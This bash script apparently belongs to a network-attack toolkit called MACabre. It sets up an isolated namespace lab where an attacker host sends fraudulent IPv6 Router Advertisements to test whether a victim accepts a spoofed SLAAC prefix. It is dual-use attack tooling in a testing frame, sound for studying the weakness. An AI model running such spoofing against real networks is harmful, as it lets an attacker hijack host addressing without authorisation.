#!/usr/bin/env bash
# Isolated SLAAC prefix spoofing lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   router:   the legitimate router. It advertises LEGIT_PREFIX with a default router lifetime.
#   victim:   a host that accepts Router Advertisements (default kernel setting).
#   attacker: a host that sends RAs with router lifetime 0 and a fraudulent /64, FAKE_PREFIX,
#             with the autonomous flag, using MACabre's module.
#
# Phases:
#   Phase 0 (setup): the router advertises LEGIT_PREFIX. The victim must have the router as its default
#            route and an address in LEGIT_PREFIX. If not, the lab cannot tell anything and exits 2.
#   Phase 1 (control): no fraudulent RA has been sent. The victim has no address in FAKE_PREFIX.
#            If it already has one, the lab cannot tell anything and exits 2.
#   Phase 2 (attack): the attacker sends RAs for FAKE_PREFIX. The victim must configure an address
#            inside FAKE_PREFIX, and its default route must still be the legitimate router.
#
# Exit 0 when the control holds and the victim configured a fake-prefix address without changing its
# default router. Exit 1 when either does not hold. Exit 2 when the setup or control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/slaac_prefix_spoofing_lab.sh
#
# Requirements: iproute2 (ip) with IPv6 enabled in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
LEGIT_PREFIX="2001:db8:5000::/64"
LEGIT_MATCH="2001:db8:5000:"
FAKE_PREFIX="2001:db8:bad:1::/64"
FAKE_MATCH="2001:db8:bad:1:"
ROUTER_MAC="02:00:00:00:10:01"
ROUTER_LL="fe80::ff:fe00:1001"         # EUI-64 link-local for ROUTER_MAC
VICTIM_MAC="02:00:00:00:10:02"
ATTACKER_MAC="02:00:00:00:10:03"
ATTACKER_LL="fe80::ff:fe00:1003"       # EUI-64 link-local for ATTACKER_MAC

stop_lab() {
    for ns in lan router victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add router
ip netns add victim
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for pair in "rtr:router:$ROUTER_MAC" "vic:victim:$VICTIM_MAC" "atk:attacker:$ATTACKER_MAC"; do
    IFS=: read -r name ns mac <<<"$pair"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
done

LEGIT_CODE='
import sys, threading
from macabre.attacks.rogue_router_advertisement import RogueRouterAdvertisementConfig, run_rogue_router_advertisement
stats = run_rogue_router_advertisement(
    RogueRouterAdvertisementConfig(iface=sys.argv[1], source_mac=sys.argv[2], prefix=sys.argv[3], frames=2),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

FAKE_CODE='
import sys, threading
from macabre.attacks.slaac_prefix_spoofing import SlaacPrefixSpoofingConfig, run_slaac_prefix_spoofing
stats = run_slaac_prefix_spoofing(
    SlaacPrefixSpoofingConfig(iface=sys.argv[1], source_mac=sys.argv[2], prefix=sys.argv[3], frames=3),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# Prints "yes" when the victim has a default route through ROUTER_LL, otherwise "no".
has_legit_router() {
    if ip netns exec victim ip -6 route show default 2>/dev/null | grep -q "via $ROUTER_LL"; then
        echo yes
    else
        echo no
    fi
}

# Prints "yes" when the victim has a default route through ATTACKER_LL, otherwise "no".
has_attacker_router() {
    if ip netns exec victim ip -6 route show default 2>/dev/null | grep -q "via $ATTACKER_LL"; then
        echo yes
    else
        echo no
    fi
}

# Prints "yes" when the victim has a global address inside the given prefix match, otherwise "no".
has_address_in() {
    if ip netns exec victim ip -6 addr show dev h-vic scope global 2>/dev/null | grep -q "inet6 $1"; then
        echo yes
    else
        echo no
    fi
}

echo "Phase 0: setup, the legitimate router advertises $LEGIT_PREFIX"
ip netns exec router env PYTHONPATH="$ROOT/src" "$PY" -c "$LEGIT_CODE" h-rtr "$ROUTER_MAC" "$LEGIT_PREFIX" >/dev/null 2>&1 || true
sleep 4
SETUP_ROUTER="$(has_legit_router)"
SETUP_LEGIT="$(has_address_in "$LEGIT_MATCH")"
echo "  default router via $ROUTER_LL: $SETUP_ROUTER"
echo "  address inside $LEGIT_PREFIX: $SETUP_LEGIT"
echo

echo "Phase 1: control, no fraudulent RA sent"
BASE_FAKE="$(has_address_in "$FAKE_MATCH")"
BASE_ATTACKER="$(has_attacker_router)"
echo "  address inside $FAKE_PREFIX: $BASE_FAKE"
echo "  default router via $ATTACKER_LL: $BASE_ATTACKER"
echo

echo "Phase 2: attacker sends Router Advertisements with router lifetime 0 for $FAKE_PREFIX, with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$FAKE_CODE" h-atk "$ATTACKER_MAC" "$FAKE_PREFIX" 2>/dev/null || echo 0)"
echo "  advertisements sent: $SENT"
sleep 4
FAKE="$(has_address_in "$FAKE_MATCH")"
ROUTER="$(has_legit_router)"
ATTACKER_ROUTER="$(has_attacker_router)"
echo "  address inside $FAKE_PREFIX: $FAKE"
echo "  default router via $ROUTER_LL: $ROUTER"
echo "  default router via $ATTACKER_LL: $ATTACKER_ROUTER"
echo

if [[ "$SETUP_ROUTER" != "yes" || "$SETUP_LEGIT" != "yes" ]]; then
    echo "Setup: the victim did not take the legitimate router and prefix. Result unreliable."
    exit 2
fi
if [[ "$BASE_FAKE" != "no" || "$BASE_ATTACKER" != "no" ]]; then
    echo "Control: the victim already had a fraudulent-prefix address or the attacker's router before the attack. Result unreliable."
    exit 2
fi
if [[ "$FAKE" == "yes" && "$ROUTER" == "yes" && "$ATTACKER_ROUTER" == "no" ]]; then
    echo "Result: the victim configured an address inside $FAKE_PREFIX from a RA with router lifetime 0, and kept the legitimate router. Vulnerable: autoconfiguration accepts unauthenticated prefixes from a sender that is not a router."
    exit 0
fi
echo "Result: the victim did not accept the fraudulent prefix (address: $FAKE, legitimate router: $ROUTER, attacker router: $ATTACKER_ROUTER). Not validated."
exit 1
